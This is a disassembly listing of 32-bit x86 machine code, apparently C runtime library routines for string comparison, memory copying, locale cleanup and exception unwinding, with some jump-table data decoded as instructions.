  426451:	cmp    eax,DWORD PTR [ecx]
  426453:	je     0x426464
  426455:	cmp    eax,DWORD PTR ds:0x465b34
  42645b:	je     0x426464
  42645d:	push   eax
  42645e:	call   0x42455a
  426463:	pop    ecx
  426464:	mov    eax,DWORD PTR [esi+0x4]
  426467:	mov    ecx,DWORD PTR ds:0x465b64
  42646d:	cmp    eax,DWORD PTR [ecx+0x4]
  426470:	je     0x426481
  426472:	cmp    eax,DWORD PTR ds:0x465b38
  426478:	je     0x426481
  42647a:	push   eax
  42647b:	call   0x42455a
  426480:	pop    ecx
  426481:	mov    esi,DWORD PTR [esi+0x8]
  426484:	mov    eax,ds:0x465b64
  426489:	cmp    esi,DWORD PTR [eax+0x8]
  42648c:	je     0x42649d
  42648e:	cmp    esi,DWORD PTR ds:0x465b3c
  426494:	je     0x42649d
  426496:	push   esi
  426497:	call   0x42455a
  42649c:	pop    ecx
  42649d:	pop    esi
  42649e:	ret    
  42649f:	push   esi
  4264a0:	mov    esi,DWORD PTR [esp+0x8]
  4264a4:	test   esi,esi
  4264a6:	je     0x426576
  4264ac:	mov    eax,DWORD PTR [esi+0xc]
  4264af:	mov    ecx,DWORD PTR ds:0x465b64
  4264b5:	cmp    eax,DWORD PTR [ecx+0xc]
  4264b8:	je     0x4264c9
  4264ba:	cmp    eax,DWORD PTR ds:0x465b40
  4264c0:	je     0x4264c9
  4264c2:	push   eax
  4264c3:	call   0x42455a
  4264c8:	pop    ecx
  4264c9:	mov    eax,DWORD PTR [esi+0x10]
  4264cc:	mov    ecx,DWORD PTR ds:0x465b64
  4264d2:	cmp    eax,DWORD PTR [ecx+0x10]
  4264d5:	je     0x4264e6
  4264d7:	cmp    eax,DWORD PTR ds:0x465b44
  4264dd:	je     0x4264e6
  4264df:	push   eax
  4264e0:	call   0x42455a
  4264e5:	pop    ecx
  4264e6:	mov    eax,DWORD PTR [esi+0x14]
  4264e9:	mov    ecx,DWORD PTR ds:0x465b64
  4264ef:	cmp    eax,DWORD PTR [ecx+0x14]
  4264f2:	je     0x426503
  4264f4:	cmp    eax,DWORD PTR ds:0x465b48
  4264fa:	je     0x426503
  4264fc:	push   eax
  4264fd:	call   0x42455a
  426502:	pop    ecx
  426503:	mov    eax,DWORD PTR [esi+0x18]
  426506:	mov    ecx,DWORD PTR ds:0x465b64
  42650c:	cmp    eax,DWORD PTR [ecx+0x18]
  42650f:	je     0x426520
  426511:	cmp    eax,DWORD PTR ds:0x465b4c
  426517:	je     0x426520
  426519:	push   eax
  42651a:	call   0x42455a
  42651f:	pop    ecx
  426520:	mov    eax,DWORD PTR [esi+0x1c]
  426523:	mov    ecx,DWORD PTR ds:0x465b64
  426529:	cmp    eax,DWORD PTR [ecx+0x1c]
  42652c:	je     0x42653d
  42652e:	cmp    eax,DWORD PTR ds:0x465b50
  426534:	je     0x42653d
  426536:	push   eax
  426537:	call   0x42455a
  42653c:	pop    ecx
  42653d:	mov    eax,DWORD PTR [esi+0x20]
  426540:	mov    ecx,DWORD PTR ds:0x465b64
  426546:	cmp    eax,DWORD PTR [ecx+0x20]
  426549:	je     0x42655a
  42654b:	cmp    eax,DWORD PTR ds:0x465b54
  426551:	je     0x42655a
  426553:	push   eax
  426554:	call   0x42455a
  426559:	pop    ecx
  42655a:	mov    esi,DWORD PTR [esi+0x24]
  42655d:	mov    eax,ds:0x465b64
  426562:	cmp    esi,DWORD PTR [eax+0x24]
  426565:	je     0x426576
  426567:	cmp    esi,DWORD PTR ds:0x465b58
  42656d:	je     0x426576
  42656f:	push   esi
  426570:	call   0x42455a
  426575:	pop    ecx
  426576:	pop    esi
  426577:	ret    
  426578:	int3   
  426579:	int3   
  42657a:	int3   
  42657b:	int3   
  42657c:	int3   
  42657d:	int3   
  42657e:	int3   
  42657f:	int3   
  426580:	push   ebp
  426581:	mov    ebp,esp
  426583:	push   esi
  426584:	xor    eax,eax
  426586:	push   eax
  426587:	push   eax
  426588:	push   eax
  426589:	push   eax
  42658a:	push   eax
  42658b:	push   eax
  42658c:	push   eax
  42658d:	push   eax
  42658e:	mov    edx,DWORD PTR [ebp+0xc]
  426591:	lea    ecx,[ecx+0x0]
  426594:	mov    al,BYTE PTR [edx]
  426596:	or     al,al
  426598:	je     0x4265a3
  42659a:	add    edx,0x1
  42659d:	bts    DWORD PTR [esp],eax
  4265a1:	jmp    0x426594
  4265a3:	mov    esi,DWORD PTR [ebp+0x8]
  4265a6:	or     ecx,0xffffffff
  4265a9:	lea    ecx,[ecx+0x0]
  4265ac:	add    ecx,0x1
  4265af:	mov    al,BYTE PTR [esi]
  4265b1:	or     al,al
  4265b3:	je     0x4265be
  4265b5:	add    esi,0x1
  4265b8:	bt     DWORD PTR [esp],eax
  4265bc:	jae    0x4265ac
  4265be:	mov    eax,ecx
  4265c0:	add    esp,0x20
  4265c3:	pop    esi
  4265c4:	leave  
  4265c5:	ret    
  4265c6:	int3   
  4265c7:	int3   
  4265c8:	int3   
  4265c9:	int3   
  4265ca:	int3   
  4265cb:	int3   
  4265cc:	int3   
  4265cd:	int3   
  4265ce:	int3   
  4265cf:	int3   
  4265d0:	mov    edx,DWORD PTR [esp+0x4]
  4265d4:	mov    ecx,DWORD PTR [esp+0x8]
  4265d8:	test   edx,0x3
  4265de:	jne    0x42661c
  4265e0:	mov    eax,DWORD PTR [edx]
  4265e2:	cmp    al,BYTE PTR [ecx]
  4265e4:	jne    0x426614
  4265e6:	or     al,al
  4265e8:	je     0x426610
  4265ea:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ed:	jne    0x426614
  4265ef:	or     ah,ah
  4265f1:	je     0x426610
  4265f3:	shr    eax,0x10
  4265f6:	cmp    al,BYTE PTR [ecx+0x2]
  4265f9:	jne    0x426614
  4265fb:	or     al,al
  4265fd:	je     0x426610
  4265ff:	cmp    ah,BYTE PTR [ecx+0x3]
  426602:	jne    0x426614
  426604:	add    ecx,0x4
  426607:	add    edx,0x4
  42660a:	or     ah,ah
  42660c:	jne    0x4265e0
  42660e:	mov    edi,edi
  426610:	xor    eax,eax
  426612:	ret    
  426613:	nop
  426614:	sbb    eax,eax
  426616:	shl    eax,1
  426618:	add    eax,0x1
  42661b:	ret    
  42661c:	test   edx,0x1
  426622:	je     0x42663c
  426624:	mov    al,BYTE PTR [edx]
  426626:	add    edx,0x1
  426629:	cmp    al,BYTE PTR [ecx]
  42662b:	jne    0x426614
  42662d:	add    ecx,0x1
  426630:	or     al,al
  426632:	je     0x426610
  426634:	test   edx,0x2
  42663a:	je     0x4265e0
  42663c:	mov    ax,WORD PTR [edx]
  42663f:	add    edx,0x2
  426642:	cmp    al,BYTE PTR [ecx]
  426644:	jne    0x426614
  426646:	or     al,al
  426648:	je     0x426610
  42664a:	cmp    ah,BYTE PTR [ecx+0x1]
  42664d:	jne    0x426614
  42664f:	or     ah,ah
  426651:	je     0x426610
  426653:	add    ecx,0x2
  426656:	jmp    0x4265e0
  426658:	int3   
  426659:	int3   
  42665a:	int3   
  42665b:	int3   
  42665c:	int3   
  42665d:	int3   
  42665e:	int3   
  42665f:	int3   
  426660:	mov    eax,DWORD PTR [esp+0xc]
  426664:	test   eax,eax
  426666:	je     0x4266b2
  426668:	mov    edx,DWORD PTR [esp+0x4]
  42666c:	push   esi
  42666d:	push   edi
  42666e:	mov    esi,edx
  426670:	mov    edi,DWORD PTR [esp+0x10]
  426674:	or     edx,edi
  426676:	and    edx,0x3
  426679:	je     0x4266b3
  42667b:	test   eax,0x1
  426680:	je     0x426693
  426682:	mov    cl,BYTE PTR [esi]
  426684:	cmp    cl,BYTE PTR [edi]
  426686:	jne    0x4266e0
  426688:	add    esi,0x1
  42668b:	add    edi,0x1
  42668e:	sub    eax,0x1
  426691:	je     0x4266b0
  426693:	mov    cl,BYTE PTR [esi]
  426695:	mov    dl,BYTE PTR [edi]
  426697:	cmp    cl,dl
  426699:	jne    0x4266e0
  42669b:	mov    cl,BYTE PTR [esi+0x1]
  42669e:	mov    dl,BYTE PTR [edi+0x1]
  4266a1:	cmp    cl,dl
  4266a3:	jne    0x4266e0
  4266a5:	add    edi,0x2
  4266a8:	add    esi,0x2
  4266ab:	sub    eax,0x2
  4266ae:	jne    0x426693
  4266b0:	pop    edi
  4266b1:	pop    esi
  4266b2:	ret    
  4266b3:	mov    ecx,eax
  4266b5:	and    eax,0x3
  4266b8:	shr    ecx,0x2
  4266bb:	je     0x4266e8
  4266bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266bf:	je     0x4266e8
  4266c1:	mov    ecx,DWORD PTR [esi-0x4]
  4266c4:	mov    edx,DWORD PTR [edi-0x4]
  4266c7:	cmp    cl,dl
  4266c9:	jne    0x4266db
  4266cb:	cmp    ch,dh
  4266cd:	jne    0x4266db
  4266cf:	shr    ecx,0x10
  4266d2:	shr    edx,0x10
  4266d5:	cmp    cl,dl
  4266d7:	jne    0x4266db
  4266d9:	cmp    ch,dh
  4266db:	mov    eax,0x0
  4266e0:	sbb    eax,eax
  4266e2:	pop    edi
  4266e3:	sbb    eax,0xffffffff
  4266e6:	pop    esi
  4266e7:	ret    
  4266e8:	test   eax,eax
  4266ea:	je     0x4266b0
  4266ec:	mov    edx,DWORD PTR [esi]
  4266ee:	mov    ecx,DWORD PTR [edi]
  4266f0:	cmp    dl,cl
  4266f2:	jne    0x4266db
  4266f4:	sub    eax,0x1
  4266f7:	je     0x426715
  4266f9:	cmp    dh,ch
  4266fb:	jne    0x4266db
  4266fd:	sub    eax,0x1
  426700:	je     0x426715
  426702:	and    ecx,0xff0000
  426708:	and    edx,0xff0000
  42670e:	cmp    edx,ecx
  426710:	jne    0x4266db
  426712:	sub    eax,0x1
  426715:	pop    edi
  426716:	pop    esi
  426717:	ret    
  426718:	int3   
  426719:	int3   
  42671a:	int3   
  42671b:	int3   
  42671c:	int3   
  42671d:	int3   
  42671e:	int3   
  42671f:	int3   
  426720:	push   ebp
  426721:	mov    ebp,esp
  426723:	push   edi
  426724:	push   esi
  426725:	push   ebx
  426726:	mov    ecx,DWORD PTR [ebp+0x10]
  426729:	jecxz  0x426752
  42672b:	mov    ebx,ecx
  42672d:	mov    edi,DWORD PTR [ebp+0x8]
  426730:	mov    esi,edi
  426732:	xor    eax,eax
  426734:	repnz scas al,BYTE PTR es:[edi]
  426736:	neg    ecx
  426738:	add    ecx,ebx
  42673a:	mov    edi,esi
  42673c:	mov    esi,DWORD PTR [ebp+0xc]
  42673f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426741:	mov    al,BYTE PTR [esi-0x1]
  426744:	xor    ecx,ecx
  426746:	cmp    al,BYTE PTR [edi-0x1]
  426749:	ja     0x426750
  42674b:	je     0x426752
  42674d:	sub    ecx,0x2
  426750:	not    ecx
  426752:	mov    eax,ecx
  426754:	pop    ebx
  426755:	pop    esi
  426756:	pop    edi
  426757:	leave  
  426758:	ret    
  426759:	int3   
  42675a:	int3   
  42675b:	int3   
  42675c:	int3   
  42675d:	int3   
  42675e:	int3   
  42675f:	int3   
  426760:	push   ebp
  426761:	mov    ebp,esp
  426763:	push   esi
  426764:	xor    eax,eax
  426766:	push   eax
  426767:	push   eax
  426768:	push   eax
  426769:	push   eax
  42676a:	push   eax
  42676b:	push   eax
  42676c:	push   eax
  42676d:	push   eax
  42676e:	mov    edx,DWORD PTR [ebp+0xc]
  426771:	lea    ecx,[ecx+0x0]
  426774:	mov    al,BYTE PTR [edx]
  426776:	or     al,al
  426778:	je     0x426783
  42677a:	add    edx,0x1
  42677d:	bts    DWORD PTR [esp],eax
  426781:	jmp    0x426774
  426783:	mov    esi,DWORD PTR [ebp+0x8]
  426786:	mov    edi,edi
  426788:	mov    al,BYTE PTR [esi]
  42678a:	or     al,al
  42678c:	je     0x42679a
  42678e:	add    esi,0x1
  426791:	bt     DWORD PTR [esp],eax
  426795:	jae    0x426788
  426797:	lea    eax,[esi-0x1]
  42679a:	add    esp,0x20
  42679d:	pop    esi
  42679e:	leave  
  42679f:	ret    
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   ebx
  4267a4:	push   esi
  4267a5:	push   edi
  4267a6:	push   ebp
  4267a7:	push   0x0
  4267a9:	push   0x0
  4267ab:	push   0x4267b8
  4267b0:	push   DWORD PTR [ebp+0x8]
  4267b3:	call   0x42722e
  4267b8:	pop    ebp
  4267b9:	pop    edi
  4267ba:	pop    esi
  4267bb:	pop    ebx
  4267bc:	mov    esp,ebp
  4267be:	pop    ebp
  4267bf:	ret    
  4267c0:	mov    ecx,DWORD PTR [esp+0x4]
  4267c4:	test   DWORD PTR [ecx+0x4],0x6
  4267cb:	mov    eax,0x1
  4267d0:	je     0x4267e1
  4267d2:	mov    eax,DWORD PTR [esp+0x8]
  4267d6:	mov    edx,DWORD PTR [esp+0x10]
  4267da:	mov    DWORD PTR [edx],eax
  4267dc:	mov    eax,0x3
  4267e1:	ret    
  4267e2:	push   ebx
  4267e3:	push   esi
  4267e4:	push   edi
  4267e5:	mov    eax,DWORD PTR [esp+0x10]
  4267e9:	push   eax
  4267ea:	push   0xfffffffe
  4267ec:	push   0x4267c0
  4267f1:	push   DWORD PTR fs:0x0
  4267f8:	mov    DWORD PTR fs:0x0,esp
  4267ff:	mov    eax,DWORD PTR [esp+0x20]
  426803:	mov    ebx,DWORD PTR [eax+0x8]
  426806:	mov    esi,DWORD PTR [eax+0xc]
  426809:	cmp    esi,0xffffffff
  42680c:	je     0x42683c
  42680e:	cmp    esi,DWORD PTR [esp+0x24]
  426812:	je     0x42683c
  426814:	lea    esi,[esi+esi*2]
  426817:	mov    ecx,DWORD PTR [ebx+esi*4]
  42681a:	mov    DWORD PTR [esp+0x8],ecx
  42681e:	mov    DWORD PTR [eax+0xc],ecx
  426821:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426826:	jne    0x42683a
  426828:	push   0x101
  42682d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426831:	call   0x426876
  426836:	call   DWORD PTR [ebx+esi*4+0x8]
  42683a:	jmp    0x4267ff
  42683c:	pop    DWORD PTR fs:0x0
  426843:	add    esp,0xc
  426846:	pop    edi
  426847:	pop    esi
  426848:	pop    ebx
  426849:	ret    
  42684a:	xor    eax,eax
  42684c:	mov    ecx,DWORD PTR fs:0x0
  426853:	cmp    DWORD PTR [ecx+0x4],0x4267c0
  42685a:	jne    0x42686c
  42685c:	mov    edx,DWORD PTR [ecx+0xc]
  42685f:	mov    edx,DWORD PTR [edx+0xc]
  426862:	cmp    DWORD PTR [ecx+0x8],edx
  426865:	jne    0x42686c
  426867:	mov    eax,0x1
  42686c:	ret    
  42686d:	push   ebx
  42686e:	push   ecx
  42686f:	mov    ebx,0x465b7c
  426874:	jmp    0x426880
  426876:	push   ebx
  426877:	push   ecx
  426878:	mov    ebx,0x465b7c
  42687d:	mov    ecx,DWORD PTR [ebp+0x8]
  426880:	mov    DWORD PTR [ebx+0x8],ecx
  426883:	mov    DWORD PTR [ebx+0x4],eax
  426886:	mov    DWORD PTR [ebx+0xc],ebp
  426889:	pop    ecx
  42688a:	pop    ebx
  42688b:	ret    0x4
  42688e:	int3   
  42688f:	int3   
  426890:	push   ebp
  426891:	mov    ebp,esp
  426893:	push   edi
  426894:	push   esi
  426895:	mov    esi,DWORD PTR [ebp+0xc]
  426898:	mov    ecx,DWORD PTR [ebp+0x10]
  42689b:	mov    edi,DWORD PTR [ebp+0x8]
  42689e:	mov    eax,ecx
  4268a0:	mov    edx,ecx
  4268a2:	add    eax,esi
  4268a4:	cmp    edi,esi
  4268a6:	jbe    0x4268b0
  4268a8:	cmp    edi,eax
  4268aa:	jb     0x426a2c
  4268b0:	test   edi,0x3
  4268b6:	jne    0x4268cc
  4268b8:	shr    ecx,0x2
  4268bb:	and    edx,0x3
  4268be:	cmp    ecx,0x8
  4268c1:	jb     0x4268ec
  4268c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c5:	jmp    DWORD PTR [edx*4+0x4269dc]
  4268cc:	mov    eax,edi
  4268ce:	mov    edx,0x3
  4268d3:	sub    ecx,0x4
  4268d6:	jb     0x4268e4
  4268d8:	and    eax,0x3
  4268db:	add    ecx,eax
  4268dd:	jmp    DWORD PTR [eax*4+0x4268f0]
  4268e4:	jmp    DWORD PTR [ecx*4+0x4269ec]
  4268eb:	nop
  4268ec:	jmp    DWORD PTR [ecx*4+0x426970]
  4268f3:	nop
  4268f4:	add    BYTE PTR [ecx+0x42],ch
  4268f7:	add    BYTE PTR [ecx+ebp*2],ch
  4268fa:	inc    edx
  4268fb:	add    BYTE PTR [eax+0x69],dl
  4268fe:	inc    edx
  4268ff:	add    BYTE PTR [ebx],ah
  426901:	ror    DWORD PTR [edx-0x75f877fa],1
  426907:	inc    esi
  426908:	add    DWORD PTR [eax+0x468a0147],ecx
  42690e:	add    al,cl
  426910:	jmp    0x289f117
  426915:	add    esi,0x3
  426918:	add    edi,0x3
  42691b:	cmp    ecx,0x8
  42691e:	jb     0x4268ec
  426920:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426922:	jmp    DWORD PTR [edx*4+0x4269dc]
  426929:	lea    ecx,[ecx+0x0]
  42692c:	and    edx,ecx
  42692e:	mov    al,BYTE PTR [esi]
  426930:	mov    BYTE PTR [edi],al
  426932:	mov    al,BYTE PTR [esi+0x1]
  426935:	shr    ecx,0x2
  426938:	mov    BYTE PTR [edi+0x1],al
  42693b:	add    esi,0x2
  42693e:	add    edi,0x2
  426941:	cmp    ecx,0x8
  426944:	jb     0x4268ec
  426946:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426948:	jmp    DWORD PTR [edx*4+0x4269dc]
  42694f:	nop
  426950:	and    edx,ecx
  426952:	mov    al,BYTE PTR [esi]
  426954:	mov    BYTE PTR [edi],al
  426956:	add    esi,0x1
  426959:	shr    ecx,0x2
  42695c:	add    edi,0x1
  42695f:	cmp    ecx,0x8
  426962:	jb     0x4268ec
  426964:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426966:	jmp    DWORD PTR [edx*4+0x4269dc]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	shr    DWORD PTR [ecx+0x42],cl
  426973:	add    al,al
  426975:	imul   eax,DWORD PTR [edx+0x0],0x4269b8
  42697c:	mov    al,0x69
  42697e:	inc    edx
  42697f:	add    BYTE PTR [eax-0x5fffbd97],ch
  426985:	imul   eax,DWORD PTR [edx+0x0],0x426998
  42698c:	nop
  42698d:	imul   eax,DWORD PTR [edx+0x0],0xe48e448b
  426994:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426998:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42699c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4269a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4269a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4269a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4269ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4269b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4269b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4269b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4269bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4269c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4269c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4269c8:	lea    eax,[ecx*4+0x0]
  4269cf:	add    esi,eax
  4269d1:	add    edi,eax
  4269d3:	jmp    DWORD PTR [edx*4+0x4269dc]
  4269da:	mov    edi,edi
  4269dc:	in     al,dx
  4269dd:	imul   eax,DWORD PTR [edx+0x0],0x4269f4
  4269e4:	add    BYTE PTR [edx+0x42],ch
  4269e7:	add    BYTE PTR [edx+ebp*2],dl
  4269ea:	inc    edx
  4269eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4269f1:	leave  
  4269f2:	ret    
  4269f3:	nop
  4269f4:	mov    al,BYTE PTR [esi]
  4269f6:	mov    BYTE PTR [edi],al
  4269f8:	mov    eax,DWORD PTR [ebp+0x8]
  4269fb:	pop    esi
  4269fc:	pop    edi
  4269fd:	leave  
  4269fe:	ret    
  4269ff:	nop
  426a00:	mov    al,BYTE PTR [esi]
  426a02:	mov    BYTE PTR [edi],al
  426a04:	mov    al,BYTE PTR [esi+0x1]
  426a07:	mov    BYTE PTR [edi+0x1],al
  426a0a:	mov    eax,DWORD PTR [ebp+0x8]
  426a0d:	pop    esi
  426a0e:	pop    edi
  426a0f:	leave  
  426a10:	ret    
  426a11:	lea    ecx,[ecx+0x0]
  426a14:	mov    al,BYTE PTR [esi]
  426a16:	mov    BYTE PTR [edi],al
  426a18:	mov    al,BYTE PTR [esi+0x1]
  426a1b:	mov    BYTE PTR [edi+0x1],al
  426a1e:	mov    al,BYTE PTR [esi+0x2]
  426a21:	mov    BYTE PTR [edi+0x2],al
  426a24:	mov    eax,DWORD PTR [ebp+0x8]
  426a27:	pop    esi
  426a28:	pop    edi
  426a29:	leave  
  426a2a:	ret    
  426a2b:	nop
  426a2c:	lea    esi,[ecx+esi*1-0x4]
  426a30:	lea    edi,[ecx+edi*1-0x4]
  426a34:	test   edi,0x3
  426a3a:	jne    0x426a60
  426a3c:	shr    ecx,0x2
  426a3f:	and    edx,0x3
  426a42:	cmp    ecx,0x8
  426a45:	jb     0x426a54
  426a47:	std    
  426a48:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a4a:	cld    
  426a4b:	jmp    DWORD PTR [edx*4+0x426b78]
  426a52:	mov    edi,edi
  426a54:	neg    ecx
  426a56:	jmp    DWORD PTR [ecx*4+0x426b28]
  426a5d:	lea    ecx,[ecx+0x0]
  426a60:	mov    eax,edi
  426a62:	mov    edx,0x3
  426a67:	cmp    ecx,0x4
  426a6a:	jb     0x426a78
  426a6c:	and    eax,0x3
  426a6f:	sub    ecx,eax
  426a71:	jmp    DWORD PTR [eax*4+0x426a7c]
  426a78:	jmp    DWORD PTR [ecx*4+0x426b78]
  426a7f:	nop
  426a80:	mov    WORD PTR [edx+0x42],gs
  426a83:	add    BYTE PTR [eax-0x27ffbd96],dh
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [edx-0x2edcfcba],cl
  426a91:	mov    BYTE PTR [edi+0x3],al
  426a94:	sub    esi,0x1
  426a97:	shr    ecx,0x2
  426a9a:	sub    edi,0x1
  426a9d:	cmp    ecx,0x8
  426aa0:	jb     0x426a54
  426aa2:	std    
  426aa3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aa5:	cld    
  426aa6:	jmp    DWORD PTR [edx*4+0x426b78]
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	and    edx,ecx
  426ab5:	mov    BYTE PTR [edi+0x3],al
  426ab8:	mov    al,BYTE PTR [esi+0x2]
  426abb:	shr    ecx,0x2
  426abe:	mov    BYTE PTR [edi+0x2],al
  426ac1:	sub    esi,0x2
  426ac4:	sub    edi,0x2
  426ac7:	cmp    ecx,0x8
  426aca:	jb     0x426a54
  426acc:	std    
  426acd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426acf:	cld    
  426ad0:	jmp    DWORD PTR [edx*4+0x426b78]
  426ad7:	nop
  426ad8:	mov    al,BYTE PTR [esi+0x3]
  426adb:	and    edx,ecx
  426add:	mov    BYTE PTR [edi+0x3],al
  426ae0:	mov    al,BYTE PTR [esi+0x2]
  426ae3:	mov    BYTE PTR [edi+0x2],al
  426ae6:	mov    al,BYTE PTR [esi+0x1]
  426ae9:	shr    ecx,0x2
  426aec:	mov    BYTE PTR [edi+0x1],al
  426aef:	sub    esi,0x3
  426af2:	sub    edi,0x3
  426af5:	cmp    ecx,0x8
  426af8:	jb     0x426a54
  426afe:	std    
  426aff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b01:	cld    
  426b02:	jmp    DWORD PTR [edx*4+0x426b78]
  426b09:	lea    ecx,[ecx+0x0]
  426b0c:	sub    al,0x6b
  426b0e:	inc    edx
  426b0f:	add    BYTE PTR [ebx+ebp*2],dh
  426b12:	inc    edx
  426b13:	add    BYTE PTR [ebx+ebp*2],bh
  426b16:	inc    edx
  426b17:	add    BYTE PTR [ebx+ebp*2+0x42],al
  426b1b:	add    BYTE PTR [ebx+ebp*2+0x42],cl
  426b1f:	add    BYTE PTR [ebx+ebp*2+0x42],dl
  426b23:	add    BYTE PTR [ebx+ebp*2+0x42],bl
  426b27:	add    BYTE PTR [edi+0x6b],ch
  426b2a:	inc    edx
  426b2b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426b31:	inc    esp
  426b32:	(bad)  
  426b33:	sbb    al,0x8b
  426b35:	inc    esp
  426b36:	mov    ds,WORD PTR [eax]
  426b38:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426b3c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426b40:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426b44:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426b48:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426b4c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426b50:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426b54:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426b58:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426b5c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426b60:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426b64:	lea    eax,[ecx*4+0x0]
  426b6b:	add    esi,eax
  426b6d:	add    edi,eax
  426b6f:	jmp    DWORD PTR [edx*4+0x426b78]
  426b76:	mov    edi,edi
  426b78:	mov    BYTE PTR [ebx+0x42],ch
  426b7b:	add    BYTE PTR [eax-0x5fffbd95],dl
  426b81:	imul   eax,DWORD PTR [edx+0x0],0xffffffb4
  426b85:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426b89:	inc    ebp
  426b8a:	or     BYTE PTR [esi+0x5f],bl
  426b8d:	leave  
  426b8e:	ret    
  426b8f:	nop
  426b90:	mov    al,BYTE PTR [esi+0x3]
  426b93:	mov    BYTE PTR [edi+0x3],al
  426b96:	mov    eax,DWORD PTR [ebp+0x8]
  426b99:	pop    esi
  426b9a:	pop    edi
  426b9b:	leave  
  426b9c:	ret    
  426b9d:	lea    ecx,[ecx+0x0]
  426ba0:	mov    al,BYTE PTR [esi+0x3]
  426ba3:	mov    BYTE PTR [edi+0x3],al
  426ba6:	mov    al,BYTE PTR [esi+0x2]
  426ba9:	mov    BYTE PTR [edi+0x2],al
  426bac:	mov    eax,DWORD PTR [ebp+0x8]
  426baf:	pop    esi
  426bb0:	pop    edi
  426bb1:	leave  
  426bb2:	ret    
  426bb3:	nop
  426bb4:	mov    al,BYTE PTR [esi+0x3]
  426bb7:	mov    BYTE PTR [edi+0x3],al
  426bba:	mov    al,BYTE PTR [esi+0x2]
  426bbd:	mov    BYTE PTR [edi+0x2],al
  426bc0:	mov    al,BYTE PTR [esi+0x1]
  426bc3:	mov    BYTE PTR [edi+0x1],al
  426bc6:	mov    eax,DWORD PTR [ebp+0x8]
  426bc9:	pop    esi
  426bca:	pop    edi
  426bcb:	leave  
  426bcc:	ret    
  426bcd:	push   ebp
  426bce:	mov    ebp,esp
  426bd0:	sub    esp,0xc
  426bd3:	mov    eax,ds:0x465660
  426bd8:	xor    eax,DWORD PTR [ebp+0x4]
  426bdb:	and    BYTE PTR [ebp-0x6],0x0
  426bdf:	push   0x6
  426be1:	mov    DWORD PTR [ebp-0x4],eax
  426be4:	lea    eax,[ebp-0xc]
  426be7:	push   eax
  426be8:	push   0x1004
  426bed:	push   DWORD PTR [ebp+0x8]
  426bf0:	call   DWORD PTR ds:0x428110
  426bf6:	test   eax,eax
  426bf8:	jne    0x426bff
  426bfa:	or     eax,0xffffffff
  426bfd:	jmp    0x426c09
  426bff:	lea    eax,[ebp-0xc]
  426c02:	push   eax
  426c03:	call   0x426f0e
  426c08:	pop    ecx
  426c09:	mov    ecx,DWORD PTR [ebp-0x4]
  426c0c:	xor    ecx,DWORD PTR [ebp+0x4]
  426c0f:	call   0x42401c
  426c14:	leave  
  426c15:	ret    
  426c16:	push   0x38
  426c18:	push   0x428ef8
  426c1d:	call   0x423950
  426c22:	mov    eax,ds:0x465660
  426c27:	xor    eax,DWORD PTR [ebp+0x4]
  426c2a:	mov    DWORD PTR [ebp-0x1c],eax
  426c2d:	xor    edi,edi
  426c2f:	mov    DWORD PTR [ebp-0x20],edi
  426c32:	mov    DWORD PTR [ebp-0x24],edi
  426c35:	mov    eax,DWORD PTR [ebp+0x14]
  426c38:	mov    ebx,DWORD PTR [eax]
  426c3a:	mov    DWORD PTR [ebp-0x28],ebx
  426c3d:	mov    DWORD PTR [ebp-0x2c],edi
  426c40:	mov    eax,DWORD PTR [ebp+0x8]
  426c43:	cmp    eax,DWORD PTR [ebp+0xc]
  426c46:	je     0x426dbf
  426c4c:	lea    ecx,[ebp-0x40]
  426c4f:	push   ecx
  426c50:	push   eax
  426c51:	mov    esi,DWORD PTR ds:0x4280dc
  426c57:	call   esi
  426c59:	test   eax,eax
  426c5b:	je     0x426c7d
  426c5d:	cmp    DWORD PTR [ebp-0x40],0x1
  426c61:	jne    0x426c7d
  426c63:	lea    eax,[ebp-0x40]
  426c66:	push   eax
  426c67:	push   DWORD PTR [ebp+0xc]
  426c6a:	call   esi
  426c6c:	test   eax,eax
  426c6e:	je     0x426c7d
  426c70:	cmp    DWORD PTR [ebp-0x40],0x1
  426c74:	jne    0x426c7d
